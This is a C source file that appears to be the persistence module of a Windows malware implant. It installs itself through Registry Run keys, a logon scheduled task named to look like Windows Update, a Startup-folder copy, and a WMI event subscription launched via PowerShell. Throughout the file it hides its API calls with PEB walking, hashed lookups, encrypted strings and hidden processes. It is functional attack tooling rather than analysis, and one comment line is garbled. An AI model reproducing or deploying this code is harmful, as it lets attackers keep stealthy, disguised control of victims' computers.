/*
 * persistence.c — Persistence mechanisms for zialfi
 *
 * Registry Run Key, Task Scheduler, Startup Folder, WMI.
 * Translated from Zig persistence_registry.zig, persistence_scheduler.zig,
 * persistence_startup.zig, persistence_wmi.zig, persistence.zig.
 *
 * Uses PEB walk + hash resolution for dynamic API lookup.
 * Cross-compiled with mingw-w64.
 */

#include "persistence.h"
#include "config.h"
#include "peb.h"

#ifdef ENABLE_PERSISTENCE
#include "hash.h"
#include "export_resolve.h"
#include "nt_types.h"
#include <string.h>
#include <windows.h>

/* ── Constants ──────────────────────────────────────────────── */

#ifndef FALSE
#define FALSE 0
#endif
#ifndef TRUE
#define TRUE  1
#endif

/* HKEY is defined in windows.h; REG_SZ in winnt.h */
#ifndef REG_SZ
#define REG_SZ 1
#endif

/* Encrypted at build time — decrypted at use via enc_decrypt() */
#include "enc_strings.h"

#define PERSIST_VAL_NAME_LEN  ENC_PERSIST_MIRAGE_UPDATE_LEN
#define PERSIST_STARTUP_FILE_LEN ENC_PERSIST_WINDOWS_HELPER_LEN
#define PERSIST_TASK_NAME_LEN ENC_PERSIST_WINDOWS_UPDATE_LEN

#define HKLM ((HANDLE)(intptr_t)0x80000002)
#define HKCU ((HANDLE)(intptr_t)0x80000001)
/* ── Inline helpers for encrypted PEB-walk resolution ──────── */

static inline void *resolve_mod_enc(const uint8_t *enc, size_t len) {
    char buf[32]; enc_decrypt(enc, len, buf);
    return mirage_get_module_by_hash(mirage_encrypted_hash_module(buf));
}
static inline void *resolve_fn_enc(void *mod, const uint8_t *enc, size_t len) {
    char buf[32]; enc_decrypt(enc, len, buf);
    return mirage_get_function_by_hash(mod, mirage_encrypted_hash_func(buf));
}


/* ── Resolved function pointers (cached) ────────────────────── */

typedef BOOL  (*FnCreateProcessW)(PWSTR, PWSTR, PVOID, PVOID, BOOL, DWORD, PVOID, PWSTR, PVOID, PVOID);
typedef DWORD (*FnGetEnvironmentVariableW)(PWSTR, PWSTR, DWORD);
typedef BOOL  (*FnCopyFileW)(PWSTR, PWSTR, BOOL);
typedef BOOL  (*FnDeleteFileW)(PWSTR);

/* ── Helper: load kernel32 via PEB ──────────────────────────── */

static void *load_kernel32(void) { return resolve_mod_enc(enc_kernel32, ENC_KERNEL32_LEN); }

typedef NTSTATUS (*FnLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PVOID*);

static void *load_advapi32_via_ldr(void)
{
    void *ntdll = resolve_mod_enc(enc_ntdll, ENC_NTDLL_LEN);
    if (!ntdll) return NULL;
    void *adv = resolve_mod_enc(enc_advapi32, ENC_ADVAPI32_LEN);
    if (adv) return adv;
    FnLdrLoadDll ldr = (FnLdrLoadDll)resolve_fn_enc(ntdll, enc_LdrLoadDll, ENC_LDRLOADDLL_LEN);
    if (!ldr) return NULL;
    char narrow[32]; enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, narrow); WCHAR dllname[32]; for (int _i = 0; narrow[_i] && _i < 31; _i++) dllname[_i] = (WCHAR)narrow[_i]; { int _dl = 0; while (dllname[_dl]) _dl++; dllname[_dl++]=L'.'; dllname[_dl++]=L'd'; dllname[_dl++]=L'l'; dllname[_dl++]=L'l'; dllname[_dl]=L'\0'; }
    UNICODE_STRING us;
    us.Length = (USHORT)(sizeof(dllname) - sizeof(WCHAR));
    us.MaximumLength = (USHORT)sizeof(dllname);
    us.Buffer = (PWSTR)dllname;
    PVOID base = NULL;
    if (ldr(NULL, 0, &us, &base) < 0) return NULL;
    return base;
}

/* ── Helper: CreateProcessW wrapper ─────────────────────────── */

static int create_process_w(const wchar_t *cmdline)
{
    void *k32 = load_kernel32();
    if (!k32) return 0;
    FnCreateProcessW pCreateProcessW = (FnCreateProcessW)resolve_fn_enc(k32, enc_CreateProcessW, ENC_CREATEPROCESSW_LEN);
    if (!pCreateProcessW) return 0;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    wchar_t cmd_buf[4096];
    size_t len = wcslen(cmdline);
    if (len >= 4096) return 0;
    memcpy(cmd_buf, cmdline, (len + 1) * sizeof(wchar_t));
    return pCreateProcessW(NULL, cmd_buf, NULL, NULL, FALSE,
                           0x08000000 /* CREATE_NO_WINDOW */,
                           NULL, NULL, &si, &pi) != 0;
}

/* ── Helper/* ── Helper: ASCII to wide string ───────────────────────────── */

static int ascii_to_wide(const char *src, wchar_t *dst, size_t dst_chars)
{
    size_t i;
    for (i = 0; src[i] && i < dst_chars - 1; i++)
        dst[i] = (wchar_t)(unsigned char)src[i];
    dst[i] = 0;
    return (int)i;
}

/* ── Helper: wide string to ASCII ───────────────────────────── */

static int wide_to_ascii(const wchar_t *src, size_t src_len, char *dst, size_t dst_chars)
{
    size_t i;
    for (i = 0; i < src_len && i < dst_chars - 1; i++) {
        dst[i] = (src[i] < 0x80) ? (char)(unsigned char)src[i] : '?';
    }
    dst[i] = 0;
    return (int)i;
}

/* ════════════════════════════════════════════════════════════════
 *  REGISTRY PERSISTENCE
 *  Translated from persistence_registry.zig
 * ════════════════════════════════════════════════════════════════ */

typedef LSTATUS (*FnRegCreateKeyExW)(HKEY, PWSTR, DWORD, PWSTR, DWORD, DWORD, PVOID, HKEY*, DWORD*);
typedef LSTATUS (*FnRegSetValueExW)(HKEY, PWSTR, DWORD, DWORD, const BYTE*, DWORD);
typedef LSTATUS (*FnRegOpenKeyExW)(HKEY, PWSTR, DWORD, DWORD, HKEY*);
typedef LSTATUS (*FnRegDeleteValueW)(HKEY, PWSTR);
typedef LSTATUS (*FnRegCloseKey)(HKEY);

static void *load_advapi32(void)
{
    return load_advapi32_via_ldr();
}

static int set_registry_string(HKEY hkey, const char *subkey,
                               const char *value_name, const char *value)
{
    void *adv = load_advapi32();
    if (!adv) return 0;

    FnRegCreateKeyExW pRegCreateKeyExW = (FnRegCreateKeyExW)resolve_fn_enc(adv, enc_RegCreateKeyExW, ENC_REGCREATEKEYEXW_LEN);
    FnRegSetValueExW pRegSetValueExW = (FnRegSetValueExW)resolve_fn_enc(adv, enc_RegSetValueExW, ENC_REGSETVALUEEXW_LEN);
    FnRegCloseKey pRegCloseKey = (FnRegCloseKey)resolve_fn_enc(adv, enc_RegCloseKey, ENC_REGCLOSEKEY_LEN);
    if (!pRegCreateKeyExW || !pRegSetValueExW || !pRegCloseKey) return 0;

    /* Convert subkey to wide */
    wchar_t subkey_w[512];
    ascii_to_wide(subkey, subkey_w, 512);

    /* Convert value_name to wide */
    wchar_t name_w[128];
    ascii_to_wide(value_name, name_w, 128);

    HKEY key;
    LSTATUS cr = pRegCreateKeyExW(hkey, subkey_w, 0, NULL, 0,
                                   0x02000000 /* KEY_SET_VALUE */, NULL, &key, NULL);
    if (cr != 0) return 0;

    /* Convert value to wide */
    size_t vlen = strlen(value);
    wchar_t val_w[1024];
    size_t k;
    for (k = 0; k < vlen && k < 1023; k++)
        val_w[k] = (wchar_t)(unsigned char)value[k];
    val_w[k] = 0;

    LSTATUS sv = pRegSetValueExW(key, name_w, 0, REG_SZ,
                                  (const BYTE*)val_w,
                                  (DWORD)((k + 1) * sizeof(wchar_t)));
    pRegCloseKey(key);
    return (sv == 0);
}

static int delete_registry_value(HKEY hkey, const char *subkey, const char *value_name)
{
    void *adv = load_advapi32();
    if (!adv) return 0;

    FnRegOpenKeyExW pRegOpenKeyExW = (FnRegOpenKeyExW)resolve_fn_enc(adv, enc_RegOpenKeyExW, ENC_REGOPENKEYEXW_LEN);
    FnRegDeleteValueW pRegDeleteValueW = (FnRegDeleteValueW)resolve_fn_enc(adv, enc_RegDeleteValueW, ENC_REGDELETEVALUEW_LEN);
    FnRegCloseKey pRegCloseKey = (FnRegCloseKey)resolve_fn_enc(adv, enc_RegCloseKey, ENC_REGCLOSEKEY_LEN);
    if (!pRegOpenKeyExW || !pRegDeleteValueW || !pRegCloseKey) return 0;

    wchar_t subkey_w[512];
    ascii_to_wide(subkey, subkey_w, 512);

    wchar_t name_w[128];
    ascii_to_wide(value_name, name_w, 128);

    HKEY key;
    LSTATUS ok = pRegOpenKeyExW(hkey, subkey_w, 0, 0x02000000 /* KEY_SET_VALUE */, &key);
    if (ok != 0) return 0;

    LSTATUS dv = pRegDeleteValueW(key, name_w);
    pRegCloseKey(key);
    return (dv == 0);
}

int persist_registry_install(const char *exe_path)
{
    char val_name[32];
    enc_decrypt(enc_persist_mirage_update, ENC_PERSIST_MIRAGE_UPDATE_LEN, val_name);

    /* Try HKLM first, then HKCU */
    if (set_registry_string(HKLM,
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            val_name, exe_path))
        return 1;

    if (set_registry_string(HKCU,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            val_name, exe_path))
        return 1;

    return 0;
}

int persist_registry_uninstall(void)
{
    char val_name[32];
    enc_decrypt(enc_persist_mirage_update, ENC_PERSIST_MIRAGE_UPDATE_LEN, val_name);

    int lm = delete_registry_value(HKLM,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        val_name);
    int cu = delete_registry_value(HKCU,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        val_name);
    return lm || cu;
}

int persist_registry_is_installed(void)
{
    void *adv = load_advapi32();
    if (!adv) return 0;

    FnRegOpenKeyExW pRegOpenKeyExW = (FnRegOpenKeyExW)resolve_fn_enc(adv, enc_RegOpenKeyExW, ENC_REGOPENKEYEXW_LEN);
    FnRegCloseKey pRegCloseKey = (FnRegCloseKey)resolve_fn_enc(adv, enc_RegCloseKey, ENC_REGCLOSEKEY_LEN);
    if (!pRegOpenKeyExW || !pRegCloseKey) return 0;

    static const char *subkeys[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    };

    for (int s = 0; s < 2; s++) {
        wchar_t subkey_w[512];
        ascii_to_wide(subkeys[s], subkey_w, 512);

        HKEY key;
        if (pRegOpenKeyExW(HKCU, subkey_w, 0, 0x02000000, &key) == 0) {
            pRegCloseKey(key);
            return 1;
        }
        if (pRegOpenKeyExW(HKLM, subkey_w, 0, 0x02000000, &key) == 0) {
            pRegCloseKey(key);
            return 1;
        }
    }
    return 0;
}

/* ════════════════════════════════════════════════════════════════
 *  TASK SCHEDULER PERSISTENCE
 *  Translated from persistence_scheduler.zig
 * ════════════════════════════════════════════════════════════════ */

int persist_scheduler_install(const char *exe_path)
{
    /* Build: schtasks /create /tn "WindowsUpdate" /tr "<exe_path>" /sc onlogon /f */
    char task_name[32];
    enc_decrypt(enc_persist_windows_update, ENC_PERSIST_WINDOWS_UPDATE_LEN, task_name);

    char cmd[4096];
    int pos = 0;

    memcpy(cmd + pos, "schtasks /create /tn \"", 22); pos += 22;
    size_t tname_len = strlen(task_name);
    memcpy(cmd + pos, task_name, tname_len); pos += (int)tname_len;
    memcpy(cmd + pos, "\" /tr \"", 7); pos += 7;
    size_t exe_len = strlen(exe_path);
    if (pos + exe_len + 20 > 4096) return 0;
    memcpy(cmd + pos, exe_path, exe_len); pos += (int)exe_len;
    memcpy(cmd + pos, "\" /sc onlogon /f", 15); pos += 15;
    cmd[pos] = 0;

    wchar_t cmd_w[4096];
    ascii_to_wide(cmd, cmd_w, 4096);

    return create_process_w(cmd_w);
}

int persist_scheduler_uninstall(void)
{
    /* Build: schtasks /delete /tn "WindowsUpdate" /f */
    char task_name[32];
    enc_decrypt(enc_persist_windows_update, ENC_PERSIST_WINDOWS_UPDATE_LEN, task_name);

    char cmd[512];
    int pos = 0;

    memcpy(cmd + pos, "schtasks /delete /tn \"", 21); pos += 21;
    size_t tname_len = strlen(task_name);
    memcpy(cmd + pos, task_name, tname_len); pos += (int)tname_len;
    memcpy(cmd + pos, "\" /f", 4); pos += 4;
    cmd[pos] = 0;

    wchar_t cmd_w[512];
    ascii_to_wide(cmd, cmd_w, 512);

    return create_process_w(cmd_w);
}

/* ════════════════════════════════════════════════════════════════
 *  STARTUP FOLDER PERSISTENCE
 *  Translated from persistence_startup.zig
 * ════════════════════════════════════════════════════════════════ */

static int get_env_w(const char *name, wchar_t *buf, DWORD buf_chars)
{
    void *k32 = load_kernel32();
    if (!k32) return 0;

    FnGetEnvironmentVariableW pGetEnv = (FnGetEnvironmentVariableW)resolve_fn_enc(k32, enc_GetEnvironmentVariableW, ENC_GETENVIRONMENTVARIABLEW_LEN);
    if (!pGetEnv) return 0;

    wchar_t name_w[128];
    ascii_to_wide(name, name_w, 128);

    return (int)pGetEnv(name_w, buf, buf_chars);
}

int persist_startup_install(const char *exe_path)
{
    /* Build target: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsHelper.exe */
    wchar_t appdata[1024];
    int appdata_len = get_env_w("APPDATA", appdata, 1024);
    if (appdata_len == 0) return 0;

    static const char *startup_dir = "Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    char startup_file[32];
    enc_decrypt(enc_persist_windows_helper, ENC_PERSIST_WINDOWS_HELPER_LEN, startup_file);

    /* Convert startup_dir and startup_file to wide */
    wchar_t dir_w[512], file_w[128];
    int dir_len = ascii_to_wide(startup_dir, dir_w, 512);
    int file_len = ascii_to_wide(startup_file, file_w, 128);

    /* Build full target path */
    wchar_t target[2048];
    int pos = 0;
    memcpy(target + pos, appdata, appdata_len * sizeof(wchar_t)); pos += appdata_len;
    target[pos++] = L'\\';
    memcpy(target + pos, dir_w, dir_len * sizeof(wchar_t)); pos += dir_len;
    target[pos++] = L'\\';
    memcpy(target + pos, file_w, file_len * sizeof(wchar_t)); pos += file_len;
    target[pos] = 0;

    /* Copy file */
    void *k32 = load_kernel32();
    if (!k32) return 0;

    FnCopyFileW pCopyFileW = (FnCopyFileW)resolve_fn_enc(k32, enc_CopyFileW, ENC_COPYFILEW_LEN);
    if (!pCopyFileW) return 0;

    wchar_t src_w[1024];
    ascii_to_wide(exe_path, src_w, 1024);

    return pCopyFileW(src_w, target, FALSE) != 0;
}

int persist_startup_uninstall(void)
{
    wchar_t appdata[1024];
    int appdata_len = get_env_w("APPDATA", appdata, 1024);
    if (appdata_len == 0) return 0;

    static const char *startup_dir = "Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    char startup_file[32];
    enc_decrypt(enc_persist_windows_helper, ENC_PERSIST_WINDOWS_HELPER_LEN, startup_file);

    /* Convert appdata to ASCII for path assembly */
    char appdata_a[1024];
    wide_to_ascii(appdata, appdata_len, appdata_a, 1024);

    char path[2048];
    int pos = 0;
    size_t alen = strlen(appdata_a);
    memcpy(path + pos, appdata_a, alen); pos += (int)alen;
    path[pos++] = '\\';
    size_t dlen = strlen(startup_dir);
    memcpy(path + pos, startup_dir, dlen); pos += (int)dlen;
    path[pos++] = '\\';
    size_t flen = strlen(startup_file);
    memcpy(path + pos, startup_file, flen); pos += (int)flen;
    path[pos] = 0;

    void *k32 = load_kernel32();
    if (!k32) return 0;

    FnDeleteFileW pDeleteFileW = (FnDeleteFileW)resolve_fn_enc(k32, enc_DeleteFileW, ENC_DELETEFILEW_LEN);
    if (!pDeleteFileW) return 0;

    wchar_t path_w[2048];
    ascii_to_wide(path, path_w, 2048);

    return pDeleteFileW(path_w) != 0;
}

/* ════════════════════════════════════════════════════════════════
 *  WMI PERSISTENCE
 *  Translated from persistence_wmi.zig
 *
 *  Creates __EventFilter + ActiveScriptEventConsumer via PowerShell.
 * ════════════════════════════════════════════════════════════════ */

int persist_wmi_install(const char *exe_path)
{
    static const char *wmi_script =
        " -Command \"$f=([wmiclass]'\\\\\\\\.\\\\root\\\\subscription:__EventFilter')"
        ".CreateInstance();$f.QueryLanguage='WQL';"
        "$f.Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        "WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System''';"
        "$f.Name='WindowsHealthCheck';$f.Put();"
        "$c=([wmiclass]'\\\\\\\\.\\\\root\\\\subscription:ActiveScriptEventConsumer')"
        ".CreateInstance();$c.Name='WindowsHealthCheck';"
        "$c.ScriptingEngine='VBScript';"
        "$c.ScriptText='CreateObject(\\\"WScript.Shell\\\").Run(\\\"";

    static const char *wmi_mid =
        "\\\",0,False)';$c.Put();"
        "$f2=([wmiclass]'\\\\\\\\.\\\\root\\\\subscription:__FilterToConsumerBinding')"
        ".CreateInstance();"
        "$f2.Filter=[wmi]'\\\\\\\\.\\\\root\\\\subscription:__EventFilter.Name=\\\"WindowsHealthCheck\\\"';"
        "$f2.Consumer=[wmi]'\\\\\\\\.\\\\root\\\\subscription:ActiveScriptEventConsumer.Name=\\\"WindowsHealthCheck\\\"';"
        "$f2.Put()\"";

    /* Build: powershell -Command "..." exe_path "..." */
    char cmd[8192];
    int pos = 0;

    memcpy(cmd + pos, "powershell", 9); pos += 9;
    size_t slen = strlen(wmi_script);
    memcpy(cmd + pos, wmi_script, slen); pos += (int)slen;
    size_t elen = strlen(exe_path);
    if (pos + elen + strlen(wmi_mid) + 16 > 8192) return 0;
    memcpy(cmd + pos, exe_path, elen); pos += (int)elen;
    size_t mlen = strlen(wmi_mid);
    memcpy(cmd + pos, wmi_mid, mlen); pos += (int)mlen;
    cmd[pos] = 0;

    wchar_t cmd_w[8192];
    ascii_to_wide(cmd, cmd_w, 8192);

    return create_process_w(cmd_w);
}

int persist_wmi_uninstall(void)
{
    static const char *wmi_uninstall =
        " -Command \"Get-WmiObject -Namespace root/subscription "
        "-Class __EventFilter -Filter 'Name=\\\"WindowsHealthCheck\\\"' | Remove-WmiObject;"
        "Get-WmiObject -Namespace root/subscription "
        "-Class ActiveScriptEventConsumer -Filter 'Name=\\\"WindowsHealthCheck\\\"' | Remove-WmiObject;"
        "Get-WmiObject -Namespace root/subscription "
        "-Class __FilterToConsumerBinding -Filter '__Path LIKE \\\"%WindowsHealthCheck%\\\"' "
        "| Remove-WmiObject\"";

    char cmd[4096];
    int pos = 0;

    memcpy(cmd + pos, "powershell", 9); pos += 9;
    size_t ulen = strlen(wmi_uninstall);
    memcpy(cmd + pos, wmi_uninstall, ulen); pos += (int)ulen;
    cmd[pos] = 0;

    wchar_t cmd_w[4096];
    ascii_to_wide(cmd, cmd_w, 4096);

    return create_process_w(cmd_w);
}

/* ════════════════════════════════════════════════════════════════
 *  AGGREGATE PERSISTENCE
 *  Translated from persistence.zig
 * ════════════════════════════════════════════════════════════════ */

PersistResult persistence_install(const char *exe_path)
{
    if (persist_registry_install(exe_path))    return PERSIST_OK;
    if (persist_scheduler_install(exe_path))   return PERSIST_OK;
    if (persist_startup_install(exe_path))     return PERSIST_OK;
    if (persist_wmi_install(exe_path))         return PERSIST_OK;
    return PERSIST_FAILED;
}

PersistResult persistence_uninstall(void)
{
    int any_ok = 0;
    if (persist_registry_uninstall())  any_ok = 1;
    if (persist_scheduler_uninstall()) any_ok = 1;
    if (persist_startup_uninstall())   any_ok = 1;
    if (persist_wmi_uninstall())       any_ok = 1;
    return any_ok ? PERSIST_OK : PERSIST_FAILED;
}

int persistence_is_installed(void)
{
    return persist_registry_is_installed();
}

#endif /* ENABLE_PERSISTENCE */
